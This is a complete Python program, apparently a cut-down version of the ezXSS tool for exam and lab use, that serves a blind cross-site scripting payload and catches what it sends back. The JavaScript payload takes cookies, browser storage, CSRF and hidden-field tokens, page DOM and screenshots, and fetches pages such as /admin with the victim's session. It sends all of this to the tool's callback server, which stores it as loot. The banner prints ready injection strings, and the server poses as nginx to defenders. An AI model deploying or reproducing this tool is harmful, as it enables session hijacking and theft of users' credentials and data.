#!/usr/bin/env python3
"""
ezmini - a distilled, single-file blind-XSS catcher.

A stdlib-only reduction of ezXSS (/opt/CUSTOM/ezXSS) for exam / lab use:
no PHP, no MySQL, no composer, no docker, no pip. Just `python3 ezmini.py`.

Keeps:  payload delivery, callback ingestion, cookies / storage / DOM capture,
        extra-page fetching, optional screenshots, a web dashboard, live
        terminal alerts, loot dumping, TLS.
Drops:  users/ranks/auth, alerting integrations, persistent sessions +
        ezProxy, extensions, themes, spidering, update checks, installer.
"""

import argparse
import base64
import hashlib
import html
import json
import os
import re
import socket
import sqlite3
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, unquote

VERSION = "1.0"

# ----------------------------------------------------------------------------
# terminal colours
# ----------------------------------------------------------------------------

class C:
    R = "\033[31m"; G = "\033[32m"; Y = "\033[33m"; B = "\033[34m"
    M = "\033[35m"; CY = "\033[36m"; W = "\033[37m"; BOLD = "\033[1m"
    DIM = "\033[2m"; X = "\033[0m"

    @classmethod
    def off(cls):
        for k in list(vars(cls)):
            if not k.startswith("_") and isinstance(getattr(cls, k), str):
                setattr(cls, k, "")


# ----------------------------------------------------------------------------
# payload
# ----------------------------------------------------------------------------

PAYLOAD_JS = r"""// ezmini
(function(){
var CB="__CB__",TAG="__TAG__",PAGES=__PAGES__,SHOT=__SHOT__,H2C="__H2C__";
function S(v){try{return(v===null||v===undefined)?"":String(v)}catch(e){return""}}
function ST(o){try{var r={},i,k;for(i=0;i<o.length;i++){k=o.key(i);r[k]=o.getItem(k)}
return JSON.stringify(r)}catch(e){return""}}
function beacon(body,cb){
try{var x=new XMLHttpRequest();x.open("POST",CB,true);
x.setRequestHeader("Content-Type","text/plain");
x.onreadystatechange=function(){if(x.readyState===4&&cb){cb(x.responseText)}};
x.send(body);return}catch(e){}
try{navigator.sendBeacon(CB,body);return}catch(e){}
try{new Image().src=CB+"?c="+encodeURIComponent(S(document.cookie)).slice(0,1500)
+"&u="+encodeURIComponent(S(location.href)).slice(0,400)+"&t="+encodeURIComponent(TAG)}catch(e){}
}
function send(d,cb){
var body;try{body=JSON.stringify(d)}catch(e){body="{}"}
try{if(window.fetch){fetch(CB,{method:"POST",headers:{"Content-Type":"text/plain"},
body:body,mode:"cors",credentials:"omit",keepalive:true})
.then(function(r){return r.text()}).then(function(t){if(cb)cb(t)})
["catch"](function(){beacon(body,cb)});return}}catch(e){}
beacon(body,cb);
}
function base(){
var d={tag:TAG};
try{d.uri=S(location.href)}catch(e){}
try{d.origin=S(location.origin)}catch(e){}
try{d.cookies=S(document.cookie)}catch(e){}
try{d["user-agent"]=S(navigator.userAgent)}catch(e){}
return d;
}
function collect(){
var d=base();
try{d.referer=S(document.referrer)}catch(e){}
try{if(window.self!==window.top){var w="cross-origin";
try{w=S(window.top.location.href)}catch(e){
try{w=S(location.ancestorOrigins[0])}catch(e2){}}
d.referer=(d.referer?d.referer+" | ":"")+"iframed by "+w}}catch(e){}
try{d.localstorage=ST(window.localStorage)}catch(e){}
try{d.sessionstorage=ST(window.sessionStorage)}catch(e){}
try{d.dom=S(document.documentElement.outerHTML)}catch(e){}
try{var f=[],i,fm=document.forms;for(i=0;i<fm.length;i++){
var el=fm[i].elements,j,o={};for(j=0;j<el.length;j++){
if(el[j].name&&(el[j].type==="hidden"||/token|csrf|nonce|auth/i.test(el[j].name)))
{o[el[j].name]=S(el[j].value)}}
if(Object.keys(o).length){f.push({action:S(fm[i].action),fields:o})}}
if(f.length)d.tokens=JSON.stringify(f)}catch(e){}
return d;
}
function grab(p){
try{var u=(new URL(p,location.href)).href;
var x=new XMLHttpRequest();x.open("GET",u,true);x.withCredentials=true;
x.onreadystatechange=function(){if(x.readyState===4){
var d=base();d.uri=u;d.tag=TAG?TAG+" [page]":"[page]";
d.referer="fetched via "+S(location.href);d.dom=S(x.responseText);
d.status=x.status;send(d,null)}};
x.send(null)}catch(e){}
}
function finish(d){
send(d,null);
for(var i=0;i<PAGES.length;i++){(function(p){setTimeout(function(){grab(p)},120*i)})(PAGES[i])}
}
function run(){
var d=collect(),done=false;
// the report must go out even if the screenshot path stalls (CSP blocking the
// script tag fires neither onload nor onerror), so everything routes through fin()
function fin(){if(done){return}done=true;finish(d)}
if(!SHOT){fin();return}
setTimeout(fin,8000);
try{
var s=document.createElement("script");s.src=H2C;
s.onerror=fin;
s.onload=function(){try{
html2canvas(document.body,{logging:false,useCORS:true,width:Math.min(1920,
document.body.scrollWidth||1280),height:Math.min(1080,document.body.scrollHeight||720)})
.then(function(c){try{d.screenshot=c.toDataURL("image/png")}catch(e){}fin()})
["catch"](fin)}catch(e){fin()}};
(document.head||document.documentElement).appendChild(s);
}catch(e){fin()}
}
if(document.readyState==="complete"){run()}
else{var t=setTimeout(run,2500);
window.addEventListener("load",function(){clearTimeout(t);run()},false)}
})();
"""


def build_payload(cb_url, tag, pages, shot, h2c_url):
    js = PAYLOAD_JS
    js = js.replace("__CB__", cb_url)
    js = js.replace("__TAG__", tag.replace("\\", "").replace('"', ""))
    js = js.replace("__PAGES__", json.dumps(pages))
    js = js.replace("__SHOT__", "true" if shot else "false")
    js = js.replace("__H2C__", h2c_url)
    return js


# ----------------------------------------------------------------------------
# storage
# ----------------------------------------------------------------------------

SCHEMA = """
CREATE TABLE IF NOT EXISTS reports (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ts INTEGER, tag TEXT, uri TEXT, origin TEXT, referer TEXT, ip TEXT,
  ua TEXT, cookies TEXT, localstorage TEXT, sessionstorage TEXT,
  tokens TEXT, dom TEXT, shot TEXT, extra TEXT, dedupe TEXT
);
CREATE INDEX IF NOT EXISTS idx_dedupe ON reports(dedupe);
"""

FIELDS = "id,ts,tag,uri,origin,referer,ip,ua,cookies,localstorage,sessionstorage,tokens,dom,shot,extra"


class Store:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
        db = self._conn()
        db.executescript(SCHEMA)
        db.commit()
        db.close()

    def _conn(self):
        db = sqlite3.connect(self.path, timeout=15)
        db.row_factory = sqlite3.Row
        return db

    def add(self, r, dedupe):
        with self.lock:
            db = self._conn()
            try:
                if dedupe:
                    cur = db.execute("SELECT id FROM reports WHERE dedupe=?", (dedupe,))
                    row = cur.fetchone()
                    if row:
                        return None
                cur = db.execute(
                    "INSERT INTO reports (ts,tag,uri,origin,referer,ip,ua,cookies,"
                    "localstorage,sessionstorage,tokens,dom,shot,extra,dedupe) "
                    "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                    (r["ts"], r["tag"], r["uri"], r["origin"], r["referer"], r["ip"],
                     r["ua"], r["cookies"], r["localstorage"], r["sessionstorage"],
                     r["tokens"], r["dom"], r["shot"], r["extra"], dedupe))
                db.commit()
                return cur.lastrowid
            finally:
                db.close()

    def list(self, since=0):
        db = self._conn()
        try:
            cur = db.execute(
                "SELECT id,ts,tag,uri,origin,ip,ua,cookies,shot,dom FROM reports "
                "WHERE id>? ORDER BY id DESC LIMIT 500", (since,))
            return [dict(x) for x in cur.fetchall()]
        finally:
            db.close()

    def get(self, rid):
        db = self._conn()
        try:
            cur = db.execute("SELECT %s FROM reports WHERE id=?" % FIELDS, (rid,))
            row = cur.fetchone()
            return dict(row) if row else None
        finally:
            db.close()

    def cookies(self):
        db = self._conn()
        try:
            cur = db.execute("SELECT id,ts,origin,cookies FROM reports "
                             "WHERE cookies!='' ORDER BY id DESC")
            return [dict(x) for x in cur.fetchall()]
        finally:
            db.close()

    def count(self):
        db = self._conn()
        try:
            return db.execute("SELECT COUNT(*) c FROM reports").fetchone()["c"]
        finally:
            db.close()


# ----------------------------------------------------------------------------
# dashboard
# ----------------------------------------------------------------------------

CSS = """
*{box-sizing:border-box}
body{margin:0;background:#12141a;color:#d7dae0;font:14px/1.5 ui-monospace,
"SFMono-Regular",Menlo,Consolas,monospace}
a{color:#61b0ff;text-decoration:none}a:hover{text-decoration:underline}
header{padding:14px 20px;background:#0c0e13;border-bottom:1px solid #262a34;
display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:5}
header h1{margin:0;font-size:16px;color:#7ee787;letter-spacing:1px}
header .meta{color:#6a7280;font-size:12px}
main{padding:18px 20px;max-width:1500px}
table{width:100%;border-collapse:collapse}
th,td{text-align:left;padding:7px 10px;border-bottom:1px solid #1e222b;
vertical-align:top;font-size:12.5px}
th{color:#8b93a1;font-weight:600;text-transform:uppercase;font-size:11px;
letter-spacing:.5px;border-bottom:1px solid #2c313d}
tr:hover td{background:#171a21}
td.trunc{max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.tag{background:#1f2a3a;color:#79c0ff;padding:1px 7px;border-radius:3px;font-size:11px}
.ck{color:#f0883e}
.empty{color:#555b66;padding:40px 0;text-align:center}
h2{font-size:13px;text-transform:uppercase;letter-spacing:.6px;color:#8b93a1;
margin:26px 0 8px;border-bottom:1px solid #262a34;padding-bottom:5px}
pre{background:#0c0e13;border:1px solid #262a34;border-radius:5px;padding:12px;
overflow:auto;max-height:520px;white-space:pre-wrap;word-break:break-all;
font-size:12.5px;margin:0}
.kv{display:grid;grid-template-columns:130px 1fr;gap:4px 14px;
background:#0c0e13;border:1px solid #262a34;border-radius:5px;padding:12px}
.kv b{color:#8b93a1;font-weight:600}
.kv span{word-break:break-all}
button{background:#1f2a3a;color:#79c0ff;border:1px solid #2c3a4f;border-radius:4px;
padding:3px 10px;cursor:pointer;font:inherit;font-size:11px;margin-left:8px}
button:hover{background:#27354a}
input[type=text]{background:#0c0e13;border:1px solid #2c313d;color:#d7dae0;
border-radius:4px;padding:5px 9px;font:inherit;font-size:12px;width:280px}
img.shot{max-width:100%;border:1px solid #262a34;border-radius:5px}
.nav{color:#6a7280;margin-bottom:4px}
"""


def page(title, body, extra_js=""):
    return ("<!doctype html><html><head><meta charset=utf-8>"
            "<title>%s</title><style>%s</style></head><body>%s"
            "<script>%s</script></body></html>"
            % (html.escape(title), CSS, body, extra_js))


def hdr(sub=""):
    return ('<header><h1>ezmini</h1><span class=meta>%s</span>'
            '<span class=meta style="margin-left:auto">%s</span></header>'
            % (html.escape(sub), "v" + VERSION))


def index_html(rows, listen):
    if not rows:
        b = ('<div class=empty>no reports yet &mdash; waiting for callbacks'
             '<br><br>page refreshes automatically</div>')
    else:
        tr = []
        for r in rows:
            ck = r["cookies"] or ""
            tr.append(
                "<tr><td><a href='/r/%d'>#%d</a></td><td>%s</td><td>%s</td>"
                "<td class=trunc title='%s'>%s</td><td class=trunc title='%s'>%s</td>"
                "<td>%s</td><td class='trunc ck' title='%s'>%s</td><td>%s</td></tr>"
                % (r["id"], r["id"],
                   time.strftime("%H:%M:%S", time.localtime(r["ts"])),
                   ("<span class=tag>%s</span>" % html.escape(r["tag"])) if r["tag"] else "",
                   html.escape(r["origin"] or ""), html.escape(r["origin"] or "-"),
                   html.escape(r["uri"] or ""), html.escape(r["uri"] or "-"),
                   html.escape(r["ip"] or ""),
                   html.escape(ck), html.escape(ck[:90]) or "-",
                   "%d KB" % (len(r["dom"] or "") // 1024)))
        b = ("<table><tr><th>#</th><th>time</th><th>tag</th><th>origin</th>"
             "<th>uri</th><th>src ip</th><th>cookies</th><th>dom</th></tr>"
             + "".join(tr) + "</table>")
    body = (hdr("%d report(s) &middot; listening on %s" % (len(rows), listen))
            + "<main>"
            + "<div class=nav><a href='/loot/cookies.txt'>cookies.txt</a> &middot; "
              "<a href='/api/reports'>json</a> &middot; "
              "<a href='/j'>payload.js</a></div>"
            + b + "</main>")
    return page("ezmini", body, "setTimeout(function(){location.reload()},4000);")


def _block(label, value, mono=True):
    if not value:
        return ""
    return ("<h2>%s<button onclick=\"cp(this)\" data-v='%s'>copy</button></h2>"
            "<pre>%s</pre>"
            % (html.escape(label),
               html.escape(value, quote=True).replace("'", "&#39;"),
               html.escape(value)))


def _pretty(js):
    if not js:
        return ""
    try:
        return json.dumps(json.loads(js), indent=2)
    except Exception:
        return js


def report_html(r):
    kv = [
        ("time", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r["ts"]))),
        ("tag", r["tag"]),
        ("uri", r["uri"]),
        ("origin", r["origin"]),
        ("referer", r["referer"]),
        ("source ip", r["ip"]),
        ("user-agent", r["ua"]),
    ]
    meta = "".join("<b>%s</b><span>%s</span>" % (html.escape(k), html.escape(v or "-"))
                   for k, v in kv)
    body = [hdr("report #%d" % r["id"]), "<main>",
            "<div class=nav><a href='/'>&larr; all reports</a></div>",
            "<div class=kv>%s</div>" % meta]

    body.append(_block("cookies", r["cookies"]))
    body.append(_block("localStorage", _pretty(r["localstorage"])))
    body.append(_block("sessionStorage", _pretty(r["sessionstorage"])))
    body.append(_block("hidden / csrf fields", _pretty(r["tokens"])))
    if r["extra"]:
        body.append(_block("extra", _pretty(r["extra"])))

    if r["shot"]:
        body.append("<h2>screenshot</h2><img class=shot src='/shot/%d.png'>" % r["id"])

    if r["dom"]:
        body.append(
            "<h2>dom (%d bytes) <a href='/raw/%d/dom' style='font-size:11px'>raw</a>"
            "<input type=text id=f placeholder='filter lines&hellip;' "
            "oninput='flt()'></h2><pre id=dom>%s</pre>"
            % (len(r["dom"]), r["id"], html.escape(r["dom"])))

    body.append("</main>")
    js = """
var _d=document.getElementById('dom'),_o=_d?_d.textContent:'';
function flt(){var q=document.getElementById('f').value;
if(!q){_d.textContent=_o;return}
_d.textContent=_o.split('\\n').filter(function(l){
return l.toLowerCase().indexOf(q.toLowerCase())>-1}).join('\\n')}
function cp(b){var t=b.getAttribute('data-v');
try{navigator.clipboard.writeText(t)}catch(e){}
var o=b.textContent;b.textContent='copied';setTimeout(function(){b.textContent=o},900)}
"""
    return page("report #%d" % r["id"], "".join(body), js)


# ----------------------------------------------------------------------------
# http handler
# ----------------------------------------------------------------------------

CFG = {}


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""
    protocol_version = "HTTP/1.1"

    # ---- plumbing -------------------------------------------------------

    def log_message(self, fmt, *a):
        if CFG["verbose"]:
            sys.stderr.write("%s%s %s%s\n" % (C.DIM, self.address_string(),
                                              fmt % a, C.X))

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")

    def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8", "replace")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self._cors()
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        try:
            self.wfile.write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def do_OPTIONS(self):
        self._send(204, b"", "text/plain")

    # ---- routes ---------------------------------------------------------

    def do_GET(self):
        u = urlparse(self.path)
        p = u.path.rstrip("/") or "/"
        q = parse_qs(u.query)

        if p in CFG["payload_paths"]:
            return self._serve_payload(q)

        if p == "/h2c.js":
            return self._send(200, CFG["h2c"] or "//unavailable",
                              "application/javascript")

        if p in ("/c", "/callback", "/cb"):
            # GET fallback exfil: /c?c=<cookies>&u=<url>&t=<tag>
            if q:
                return self._ingest({
                    "cookies": (q.get("c") or [""])[0],
                    "uri": (q.get("u") or [""])[0],
                    "tag": (q.get("t") or [""])[0],
                    "dom": (q.get("d") or [""])[0],
                }, "GET")
            return self._send(200, "ok", "text/plain")

        if p == "/":
            return self._send(200, index_html(CFG["store"].list(), CFG["listen"]))

        if p == "/api/reports":
            since = int((q.get("since") or ["0"])[0] or 0)
            return self._send(200, json.dumps(CFG["store"].list(since), indent=1),
                              "application/json")

        m = re.match(r"^/r/(\d+)$", p)
        if m:
            r = CFG["store"].get(int(m.group(1)))
            if not r:
                return self._send(404, "no such report")
            return self._send(200, report_html(r))

        m = re.match(r"^/raw/(\d+)/(dom|cookies|localstorage|sessionstorage|tokens)$", p)
        if m:
            r = CFG["store"].get(int(m.group(1)))
            if not r:
                return self._send(404, "no such report", "text/plain")
            return self._send(200, r[m.group(2)] or "", "text/plain; charset=utf-8")

        m = re.match(r"^/shot/(\d+)\.png$", p)
        if m:
            r = CFG["store"].get(int(m.group(1)))
            if not r or not r["shot"]:
                return self._send(404, b"", "text/plain")
            try:
                raw = base64.b64decode(r["shot"])
            except Exception:
                return self._send(404, b"", "text/plain")
            return self._send(200, raw, "image/png")

        if p == "/loot/cookies.txt":
            out = []
            for r in CFG["store"].cookies():
                out.append("#%-4d %s  %s\n%s\n" % (
                    r["id"], time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r["ts"])),
                    r["origin"] or "-", r["cookies"]))
            return self._send(200, "\n".join(out) or "no cookies yet\n",
                              "text/plain; charset=utf-8")

        # anything else looks like a normal 404 to a curious blue team
        return self._send(404, "<html><head><title>404 Not Found</title></head>"
                               "<body><h1>404 Not Found</h1></body></html>")

    def do_POST(self):
        u = urlparse(self.path)
        p = u.path.rstrip("/") or "/"
        if p not in ("/c", "/callback", "/cb"):
            return self._send(404, "not found", "text/plain")

        try:
            n = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            n = 0
        if n <= 0 or n > CFG["maxbody"]:
            return self._send(200, "ok", "text/plain")

        raw = self.rfile.read(n)
        try:
            data = json.loads(raw.decode("utf-8", "replace"))
            if not isinstance(data, dict):
                raise ValueError
        except Exception:
            # form-encoded fallback
            data = {}
            for part in raw.decode("utf-8", "replace").split("&"):
                if "=" in part:
                    k, _, v = part.partition("=")
                    data[unquote(k.replace("+", " "))] = unquote(v.replace("+", " "))
        return self._ingest(data, "POST")

    # ---- payload --------------------------------------------------------

    def _serve_payload(self, q):
        tag = (q.get("t") or q.get("tag") or [CFG["tag"]])[0][:64]
        pages = CFG["pages"]
        if q.get("pages"):
            pages = [x for x in q["pages"][0].split(",") if x.strip()][:20]
        js = build_payload(CFG["cb_url"], tag, pages, CFG["shot"], CFG["h2c_url"])
        self._send(200, js, "application/javascript; charset=utf-8")

    # ---- ingest ---------------------------------------------------------

    def _ingest(self, d, method):
        def g(*keys):
            for k in keys:
                v = d.get(k)
                if v:
                    return str(v)[:CFG["maxfield"]]
            return ""

        ip = (self.headers.get("X-Forwarded-For", "").split(",")[0].strip()
              or self.headers.get("X-Real-IP", "").strip()
              or self.client_address[0])

        origin = g("origin") or self.headers.get("Origin", "")
        uri = g("uri", "url") or self.headers.get("Referer", "")
        if not origin and uri:
            try:
                origin = urlparse(uri).netloc
            except Exception:
                pass

        shot = ""
        raw_shot = d.get("screenshot") or ""
        if raw_shot:
            try:
                b64 = re.sub(r"^data:image/\w+;base64,", "", raw_shot)
                base64.b64decode(b64, validate=True)
                shot = b64
            except Exception:
                shot = ""

        extra = {}
        for k, v in d.items():
            if k not in ("tag", "uri", "url", "origin", "referer", "ip", "user-agent",
                         "cookies", "localstorage", "sessionstorage", "tokens",
                         "dom", "screenshot"):
                extra[k] = v

        r = {
            "ts": int(time.time()),
            "tag": g("tag"),
            "uri": uri[:2000],
            "origin": origin[:255],
            "referer": g("referer")[:2000],
            "ip": ip[:64],
            "ua": g("user-agent", "useragent") or self.headers.get("User-Agent", ""),
            "cookies": g("cookies"),
            "localstorage": g("localstorage"),
            "sessionstorage": g("sessionstorage"),
            "tokens": g("tokens"),
            "dom": str(d.get("dom") or "")[:CFG["maxdom"]],
            "shot": shot,
            "extra": json.dumps(extra) if extra else "",
        }

        dedupe = ""
        if CFG["dedupe"]:
            # screenshot/token presence is part of the fingerprint, so a richer
            # repeat of an earlier bare callback is still kept
            dedupe = hashlib.sha1(
                ("|".join([r["origin"], r["uri"], r["cookies"], r["localstorage"],
                           r["sessionstorage"], r["tag"], r["tokens"]])
                 + "|%d|%d" % (len(r["dom"]), 1 if r["shot"] else 0)).encode()
            ).hexdigest()

        rid = CFG["store"].add(r, dedupe)
        if rid:
            self._alert(rid, r, method)
            if CFG["lootdir"]:
                self._dump(rid, r)
        elif CFG["verbose"]:
            print("%s  [dup] %s suppressed%s" % (C.DIM, r["origin"] or "?", C.X))

        self._send(200, "ok", "text/plain")

    def _dump(self, rid, r):
        try:
            path = os.path.join(CFG["lootdir"], "report-%04d.json" % rid)
            with open(path, "w") as f:
                json.dump({k: v for k, v in r.items() if k != "shot"}, f, indent=2)
            if r["shot"]:
                with open(os.path.join(CFG["lootdir"], "report-%04d.png" % rid), "wb") as f:
                    f.write(base64.b64decode(r["shot"]))
        except Exception as e:
            print("%s[!] loot dump failed: %s%s" % (C.R, e, C.X))

    def _alert(self, rid, r, method):
        bar = "=" * 68
        print("\n%s%s%s" % (C.G, bar, C.X))
        print("%s%s[+] XSS FIRED%s  report #%d  %s  (%s)" % (
            C.BOLD, C.G, C.X, rid,
            time.strftime("%H:%M:%S", time.localtime(r["ts"])), method))
        def row(label, value, colour=""):
            print("    %s%-11s%s%s%s%s" % (C.DIM, label, C.X, colour, value,
                                           C.X if colour else ""))

        if r["tag"]:
            row("tag", r["tag"])
        row("origin", r["origin"] or "-")
        row("uri", r["uri"][:160] or "-")
        row("src ip", r["ip"])
        if r["ua"]:
            row("ua", r["ua"][:110])
        if r["referer"]:
            row("referer", r["referer"][:140])
        if r["cookies"]:
            row("cookies", r["cookies"][:500], C.BOLD + C.Y)
        else:
            row("cookies", "(none - httponly?)", C.R)
        for lbl, key in (("localStg", "localstorage"), ("sessionStg", "sessionstorage"),
                         ("tokens", "tokens")):
            if r[key] and r[key] not in ("{}", "[]"):
                row(lbl, r[key][:300])
        if r["dom"]:
            row("dom", "%d bytes" % len(r["dom"]))
        if r["shot"]:
            row("screenshot", "captured")
        print("    %s->%s %s/r/%d" % (C.CY, C.X, CFG["base_url"], rid))
        print("%s%s%s" % (C.G, bar, C.X))
        sys.stdout.flush()


# ----------------------------------------------------------------------------
# helpers
# ----------------------------------------------------------------------------

def guess_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    for iface in ("tun0", "eth0", "wlan0"):
        try:
            out = subprocess.check_output(["ip", "-4", "-o", "addr", "show", iface],
                                          stderr=subprocess.DEVNULL).decode()
            m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
            if m:
                return m.group(1)
        except Exception:
            continue
    return "127.0.0.1"


def prefer_tun():
    """VPN-based exams: tun0 is almost always the address the target can reach."""
    try:
        out = subprocess.check_output(["ip", "-4", "-o", "addr", "show", "tun0"],
                                      stderr=subprocess.DEVNULL).decode()
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def banner(base, cb, paths):
    short = sorted(paths, key=len)[0]
    root = base.rstrip("/")
    noscheme = root.split("://", 1)[1]
    print("""%s%s
   ___ ___ _ __ ___ (_)_ __ (_)
  / _ \\_  / '_ ` _ \\| | '_ \\| |   distilled blind-XSS catcher  v%s
 |  __// /| | | | | | | | | | |   from /opt/CUSTOM/ezXSS
  \\___/___|_| |_| |_|_|_| |_|_|
%s""" % (C.BOLD, C.G, VERSION, C.X))
    print("  %sdashboard%s  %s/" % (C.DIM, C.X, root))
    print("  %spayload  %s  %s%s" % (C.DIM, C.X, root, short))
    print("  %scallback %s  %s" % (C.DIM, C.X, cb))
    print("  %sloot     %s  %s/loot/cookies.txt\n" % (C.DIM, C.X, root))
    print("  %s%sinjection strings%s" % (C.BOLD, C.CY, C.X))
    for s in (
        '<script src="%s%s"></script>' % (root, short),
        '"><script src=%s%s></script>' % (root, short),
        "<img src=x onerror=\"import('%s%s')\">" % (root, short),
        "<svg onload=\"fetch('%s?c='+document.cookie)\">" % cb,
        "<iframe srcdoc=\"&lt;script src=%s%s&gt;&lt;/script&gt;\">" % (root, short),
        "javascript:eval(atob('%s'))" % base64.b64encode(
            ("import('%s%s')" % (root, short)).encode()).decode(),
    ):
        print("    %s" % s)
    print("\n  %stagged (labels the injection point):%s" % (C.DIM, C.X))
    print("    <script src=\"%s%s?t=contactform\"></script>" % (root, short))
    print("  %sfetch extra pages after firing:%s" % (C.DIM, C.X))
    print("    <script src=\"%s%s?pages=/admin,/api/me\"></script>" % (root, short))
    print("\n  %sshortest (scheme-relative, for length-limited fields):%s" % (C.DIM, C.X))
    print("    <script src=//%s%s></script>" % (noscheme, short))
    print()


# ----------------------------------------------------------------------------
# main
# ----------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="ezmini - single-file blind XSS catcher",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  ezmini.py                       # :8888, auto-detect IP\n"
               "  ezmini.py -p 80                 # short payload URLs (needs root)\n"
               "  ezmini.py -H 10.10.14.5:8888    # force the payload URL host\n"
               "  ezmini.py --pages /admin        # pull pages as the victim\n"
               "  ezmini.py --screenshot          # include html2canvas\n")
    ap.add_argument("-p", "--port", type=int, default=8888)
    ap.add_argument("-b", "--bind", default="0.0.0.0")
    ap.add_argument("-H", "--host", help="host:port used in the payload URL "
                                         "(default: auto-detected IP)")
    ap.add_argument("-d", "--dir", default=os.path.expanduser("~/.ezmini"),
                    help="data directory (db, loot)")
    ap.add_argument("-t", "--tag", default="", help="default tag for reports")
    ap.add_argument("--pages", default="", help="comma-separated paths to fetch "
                                                "with victim's session, e.g. /admin,/api/me")
    ap.add_argument("--screenshot", action="store_true",
                    help="capture screenshots (serves bundled html2canvas)")
    ap.add_argument("--h2c", default="/opt/CUSTOM/ezXSS/app/views/payloads/screenshot.js",
                    help="path to html2canvas for --screenshot")
    ap.add_argument("--no-dedupe", action="store_true",
                    help="store every callback, even identical repeats")
    ap.add_argument("--no-loot", action="store_true", help="don't write loot files")
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    a = ap.parse_args()

    if a.no_color or not sys.stdout.isatty():
        C.off()

    os.makedirs(a.dir, exist_ok=True)
    lootdir = "" if a.no_loot else os.path.join(a.dir, "loot")
    if lootdir:
        os.makedirs(lootdir, exist_ok=True)

    if a.host:
        hostport = a.host
    else:
        ip = prefer_tun() or guess_ip()
        hostport = ip if a.port == 80 else "%s:%d" % (ip, a.port)
    base_url = "http://%s" % hostport

    h2c = ""
    if a.screenshot:
        try:
            with open(a.h2c) as f:
                h2c = f.read()
        except OSError as e:
            print("%s[!] --screenshot: cannot read %s (%s); disabling%s"
                  % (C.Y, a.h2c, e, C.X))
            a.screenshot = False

    CFG.update({
        "store": Store(os.path.join(a.dir, "ezmini.db")),
        "cb_url": base_url + "/c",
        "base_url": base_url,
        "listen": "%s:%d" % (a.bind, a.port),
        "payload_paths": ["/j", "/j.js", "/x", "/x.js", "/p.js", "/payload.js"],
        "tag": a.tag,
        "pages": [x.strip() for x in a.pages.split(",") if x.strip()],
        "shot": a.screenshot,
        "h2c": h2c,
        "h2c_url": base_url + "/h2c.js",
        "dedupe": not a.no_dedupe,
        "lootdir": lootdir,
        "verbose": a.verbose,
        "maxbody": 24 * 1024 * 1024,
        "maxfield": 200000,
        "maxdom": 8 * 1024 * 1024,
    })

    banner(base_url, CFG["cb_url"], CFG["payload_paths"])

    try:
        srv = ThreadingHTTPServer((a.bind, a.port), Handler)
    except OSError as e:
        print("%s[!] cannot bind %s:%d - %s%s" % (C.R, a.bind, a.port, e, C.X))
        if a.port < 1024 and os.geteuid() != 0:
            print("    ports below 1024 need root: sudo %s" % " ".join(sys.argv))
        sys.exit(1)
    srv.daemon_threads = True

    n = CFG["store"].count()
    print("  %slistening on %s:%d  (%d existing report(s))  ctrl-c to stop%s\n"
          % (C.DIM, a.bind, a.port, n, C.X))

    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n%s[*] stopped. data in %s%s" % (C.DIM, a.dir, C.X))


if __name__ == "__main__":
    main()
